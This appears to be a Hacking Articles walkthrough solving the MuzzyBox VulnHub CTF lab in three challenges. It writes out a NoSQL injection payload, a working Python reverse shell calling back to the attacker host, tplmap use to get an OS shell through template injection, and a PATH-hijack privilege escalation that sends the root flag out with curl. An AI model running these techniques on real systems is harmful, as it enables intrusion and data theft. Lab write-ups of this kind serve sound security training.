@@ -1,0 +1,145 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">MuzzyBox: 1: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/muzzybox-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-03-21T18:24:55+00:00">March 21, 2020</time><time class="updated" datetime="2025-06-10T20:10:39+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <h3><span style="color: #800000;"><strong>Introduction</strong></span></h3>
+<p><span style="color: #000000;">Today we are going to crack this machine called MuzzyBox. It was created by Muzzy. Duh! This is a Capture the Flag type of challenge. The approach towards solving this machine is a bit different from the standard procedure. It consists of 3 Challenges. Each having a flag of its own. Let’s get cracking!!</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Initial Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service at port 80</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Challenge #1</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing the HTTP Service at port 3000</span></li>
+<li><span style="color: #000000;">Downloading the idcard.png template</span></li>
+<li><span style="color: #000000;">Editing the idcard.png</span></li>
+<li><span style="color: #000000;">Reading Flag #1</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Challenge #2</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing the HTTP Service at port 8989</span></li>
+<li><span style="color: #000000;">Getting a Python Shell</span></li>
+<li><span style="color: #000000;">Reading Flag #2</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Challenge #3</strong></span>
+<ul>
+<li><span style="color: #000000;">Detecting of the Server Side Template Injection</span></li>
+<li><span style="color: #000000;">Getting shell using tplmap</span></li>
+<li><span style="color: #000000;">Enumerating the shell</span></li>
+<li><span style="color: #000000;">Getting SSH session</span></li>
+<li><span style="color: #000000;">Enumerating ls command</span></li>
+<li><span style="color: #000000;">Reading Flag #3</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need to detect the IP Address of the Machine. This can be done using netdiscover command. To detect the IP Address, we can co-relate it with the MAC Address of the Machine that can be obtained from the Virtual Machine Configurations Setting. The IP Address of the machine was detected to be: 192.168.1.6</span></p>
+<pre class="lang:default decode:true ">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-in8mNOpV31A/XnZXyBpNjKI/AAAAAAAAjH8/KCsT5ifT9Oc6Aacaxh8ToZTHHhP2mQYAACLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">Now that we have the IP Address, we need to enumerate open ports on the machine. For this, we will be running a nmap scan. To get the most information and fast, we ran the Aggressive Scan.</span></p>
+<pre class="lang:default decode:true ">nmap -A 192.168.1.6</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-nN3bJuW3kYg/XnZX1BAXh5I/AAAAAAAAjIk/Cl1O6pJxtao5-BLyQcTIN3N6_WvYikBUgCLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">The Nmap Aggressive scan quickly gave us some great information. It positively informed that the following ports and services are running 22 (SSH), 80(HTTP), 3000(HTTP), 15000(HTTP). So nice of the author of the machine to give us so many HTTP services to explore. Let’s move on to Enumeration Stage.</span></p>
+<h3><span style="color: #800000;"><strong>Initial Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Let’s start with the traditional HTTP port. Port 80. We ran the browser and opened the IP Address of the Machine. It gave us an Index Page. It consists of a text file named index.txt. That was odd but okay. We moved on further by clicking on that file.</span></p>
+<pre class="lang:default decode:true ">http://192.168.1.6</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-FIJAdeuoXWg/XnZX1szintI/AAAAAAAAjIs/832qqpm9fgwQSJDTIq5ZZLxgXGCFA57EwCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">Here we get this nicely crafted introduction of the Lab Environment. This machine has been divided into 3 Challenges. Each containing a flag.</span></p>
+<pre class="lang:default decode:true ">http://192.168.1.6/index.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-1AIIqfmiP1k/XnZX10LYhOI/AAAAAAAAjIw/Mu8XyB_CLg0t7KPUrsf7JBCK41w_OJwzwCLcBGAsYHQ/s1600/4.png"/></p>
+<h3><span style="color: #800000;"><strong>Challenge #1</strong></span></h3>
+<p><span style="color: #000000;">Let’s Start with Challenge #1. The information about this challenge state that Washington University created an online library. But currently, only Principle is Authorized. The library is hosted on the HTTP service running on port 3000. Also, there is an idcard named image hosted on port 9633. Let’s start with an enumerating port of 3000.</span></p>
+<pre class="lang:default decode:true ">http://192.168.1.6:3000</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-olRuu0l18uA/XnZX2DuFyQI/AAAAAAAAjI0/6Ks21h5PauIWn9Vt2RA4Q--9nnHM_5o5ACLcBGAsYHQ/s1600/5.png"/></p>
+<p><span style="color: #000000;">Okay, that’s quite a dull library. But in the end, it is a library. If you go through the introduction text written. You might get to know that the developers of the library have implemented a security measure to prevent unauthorized access. They have used an alternative of SQL DB to secure the database. How nice of them to provide us this sweet information. The process to enter the library is to upload the idcard on this page and then the access is allowed.</span></p>
+<p><span style="color: #000000;">The template is provided to us on the port 9633. Let’s take a look at it. Now we know that the principal has access to the library. But what we don’t know is the name of the principal. We will have to figure out a way to get through this.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zOh3dpLq0hA/XnZX2UGzJDI/AAAAAAAAjI4/6Gz3Enhh1P8TEuU02cGLt813Xm_ATDn4QCLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">For starters, we downloaded the idcard.png file to our attacker machine using wget command.</span></p>
+<pre class="lang:default decode:true ">wget http://192.168.1.6:9633/idcard.png
+ls</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-rvrcT4tnlAo/XnZX2h41AJI/AAAAAAAAjI8/O0Z7CsOmtjIZPfgmh9AOdWzO8CBguQg9gCLcBGAsYHQ/s1600/7.png"/></p>
+<p><span style="color: #000000;">Initially, the introduction on the page at 3000 port told us that the authentication is checked using an alternative of SQLDB. Now if we think about it, if they are not using an SQLDB then the next best alternative is NoSQL. We tried to google some of the NoSQL based payloads that can help us in this situation. We found quite a few. We decided to use this one.</span></p>
+<pre class="lang:default decode:true">{$ne: 1}</pre>
+<p><span style="color: #000000;">Now we took the idcard.png image that we downloaded and tried to edit it to make it look like the image shown in the screenshot given below. It is quite easy you can use any online tool for the same. We made the following changes.</span></p>
+<pre class="lang:default decode:true">Name:         Raj {$ne: 1}
+
+Position:     Principal
+
+Access Level: Authorized</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PBQmLd6l_8g/XnZX2wWp_vI/AAAAAAAAjJA/FOZ7aldrxVU8ArUwCr2AaJgHW42z7gMjQCLcBGAsYHQ/s1600/8.png"/></p>
+<p><span style="color: #000000;">Now that we have the idcard ready. Let’s upload it. The upload was a success and we have successfully cracked the Challenge #1. This flag is in the form of a PIN. Let’s take note of this, we may need it down the road.</span></p>
+<pre class="lang:default decode:true">Flag #1: N$ctF{D388uG_P!N_!$_123-456-789}</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-HWxwo3B0XW4/XnZX3erM4uI/AAAAAAAAjJE/6dqv5ey9Uu4anjN4lXitscXfFOqCcE2kQCLcBGAsYHQ/s1600/9.png"/></h3>
+<h3><span style="color: #800000;"><strong>Challenge #2</strong></span></h3>
+<p><span style="color: #000000;">We move onto the next challenge. After we broke the authentication in the previous challenge, the University developed a new website. How Unnecessary! It is under maintenance. We are asked to list the current directory and read the flag file. It shouldn’t be difficult. The new website is hosted on port 8989. Upon browsing the webpage, we see that it is an error page. While we were casually looking at the errors, we saw that there was a console icon. We hovered over it and got the message that it will “Open an interactive python shell in this frame”. How convenient!</span></p>
+<pre class="lang:default decode:true">http://192.168.1.6:8989</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-db1cufVXA-4/XnZXyIGCXuI/AAAAAAAAjIA/DpQDM95jkd4LuxexBM9SbC3FBi0W2VgqQCLcBGAsYHQ/s1600/10.png"/></p>
+<p><span style="color: #000000;">We clicked on the console icon, we are greeted with a pop that tells us to enter a PIN. If we remember correctly from the previous challenge we received the flag in the form of a PIN. Let’s try it to get in.</span></p>
+<p><span style="color: #000000;"><strong>PIN: 123-456-789</strong></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--vrhiGdJu3M/XnZXx4Z0zMI/AAAAAAAAjH4/_xnJEfYScnULoCicei4EClTPLVn6_tiGQCLcBGAsYHQ/s1600/11.png"/></p>
+<p><span style="color: #000000;">Since it was in “Python Interactive Shell”, we need some python shellcode to pop up a shell over here. We went to the pentestmonkey reverse shell cheat sheet and got the Python Reverse shell. We modified it a little bit to execute it line by line as shown in the given image. We chose the port 5555 for getting the reverse shell and opened the netcat listener for the same. As soon as we execute the last command, we see that we have a shell.</span></p>
+<pre class="lang:default decode:true">import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.1.5",5555))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);'</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--JssA4jHHsM/XnZXypZUglI/AAAAAAAAjIE/WF91u92zrjgLQvSl5HLqY9eVOGcKWVwmQCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">The objective of this challenge was to list the current directory, so we ran the ls command. We found a directory named flag. Inside this directory, we found a script called ctf2.py. We read the contents of this script to get ourselves the second flag.</span></p>
+<pre class="lang:default decode:true">ls
+cd flag
+cat ctf2.py
+Flag #2: N$cTF{R34D_F!L3_/home/webssti/noflag.txt}</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-cHJMJ6CwdJM/XnZXzXro0KI/AAAAAAAAjII/MQC4qad3W38N6YFjfniAYjXvQgyC9mzBgCLcBGAsYHQ/s1600/13.png"/></p>
+<p><span style="color: #000000;">Again we seem to have a hint in this flag. It tells us to read a file at the home directory of the user webssti.</span></p>
+<h3><span style="color: #800000;"><strong>Challenge #3</strong></span></h3>
+<p><span style="color: #000000;">Two challenges down. One to go! We went back to the index for the description of the third challenge. It says that when we compromised the machine in the last challenge the root user started to audit the machine. Well, he/she really should do a better job. It wasn’t that difficult to exploit them. We are told that the root user is using sudo and bash with the ls command. This seems interesting. At last, we are told to read the final flag using an “Out-of-Band technique”. This challenge is hosted on the port 15000. We modified the URL to print the Raj name. #PersonalTouch. So what kind of vulnerability is this? Its Elementary, My Dear Watson. It is a Server-Side Template Injection.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-75XNpBeR0cU/XnZXzXGncBI/AAAAAAAAjIM/dPH4CvPNJ24uchx-uOFGPe8h-3Njly4sACLcBGAsYHQ/s1600/14.png"/></p>
+<p><span style="color: #000000;">For exploiting this vulnerability, we have just the tool. It is called tplmap. It is available on GitHub. To use it we cloned it to our attacker machine. After that, we traversed into this directory to find the python file named tplmap.py. We ran it with the proper parameters for the injection point as well as the -os-shell parameter to pop out a shell.</span></p>
+<pre class="lang:default decode:true">git clone https://github.com/epinna/tplmap.git
+cd tplmap/
+ls
+python tplmap.py -u "https://192.168.1.6:15000/page?name=*" --os-shell</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-faKfEhFCEFQ/XnZXz9IQt7I/AAAAAAAAjIQ/_A9IG8QxMSQejH-rPd8LLlLwuBrU0XDewCLcBGAsYHQ/s1600/15.png"/></p>
+<p><span style="color: #000000;">We got ourselves a shell in no time. We ran the id command to enumerate the user. Back to the previous challenge. We saw that the flag from the previous challenge asks us to read a file in the home directory of this user. We are indeed logged in as the webssti user. We checked the directory using the pwd command as well as listed the current directory contents using the ls command. There was a directory named ssti. We listed its contents to find the no_flag.txt file that we were looking for. We read the file using the cat command. This tells us the ssh username as well as password. Brilliant!!</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-GML4AEBqAL0/XnZX0HG_8hI/AAAAAAAAjIU/X8s07Oee00o1Q-5jANnScI1_wzUMiMtHwCLcBGAsYHQ/s1600/16.png"/></p>
+<p><span style="color: #000000;">Time to get that SSH shell. We entered the previously found credentials and got logged in. As the final flag was inside the root folder, we tried to read that flag. But we were unsuccessful.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ZyxePlnOnUw/XnZX0SabXvI/AAAAAAAAjIY/vPa5nEaTdgM1Sbe0mClfbkxx-H6nWb7FACLcBGAsYHQ/s1600/17.png"/></p>
+<p><span style="color: #000000;">Time to work our mind to escalate privilege on this shell. We ran the sudo -l command to enumerate but we were unsuccessful. We remembered from the introduction that the root user was using sudo as well as bash with the ls command. So it came us that Path Variable method might work here. We used the echo command to print the path for the ls command. After this, we enumerated which ls command we are running. We found that directory /usr/local/sbin was writable by our user. This means that we can create a file there and name it ls. Then we will be able to execute that file. Let’s do this using the nano command as shown in the image given below.</span></p>
+<pre class="lang:default decode:true">sudo -l
+echo $PATH
+ls /usr/local/sbin
+which ls
+ls -la /bin/ls
+ls -la /usr/local/sbin
+nano /usr/local/sbin/ls</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zdQ_CgbTdHs/XnZX0beyRyI/AAAAAAAAjIc/ISccUO3FlOQ11TR1wjHk-VMCEHQA7RuWwCLcBGAsYHQ/s1600/18.png"/></p>
+<p><span style="color: #000000;">We used curl command to send a POST request onto our attacker machine with the contents fo the Final Flag. Clever Isn’t it?</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-AOUnGqg8b6g/XnZX0-aGyzI/AAAAAAAAjIg/h56-pQp9TGARWE-3-EtH09NVghjvEV9rwCLcBGAsYHQ/s1600/19.png"/></p>
+<p><span style="color: #000000;">Now before we save that file and exit the nano editor, we started the netcat listener on the port 1234. In no time we have the Final Flag.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+Flag #3: N$CtF{8!NG000!!!__Y0U_D!D_!T_80!!!}</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-jKPCLz5JRCY/XnZX1QH93kI/AAAAAAAAjIo/G2fAXFmcMbUKanLRofCuh5AET5UC5lxOwCLcBGAsYHQ/s1600/20.png"/></p>
+<p><span style="color: #000000;">This was a good set of challenges. I enjoyed it a lot while solving it. The first and second challenge was nice and surely something that you can come across in real life. Also this format of small challenges instead a standard CTF was a fresh approach. I appreciate the author and I look forward to more in this series.</span></p>
+<p><span style="color: #000000;">We at Hacking Articles want to request everyone to stay at home and self-quarantine yourself for the prevention against the spread of the Covid-19. I am writing this article while working from home. Take Care and be Healthy!</span></p>
+<p><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on <strong>Twitter</strong> and <strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
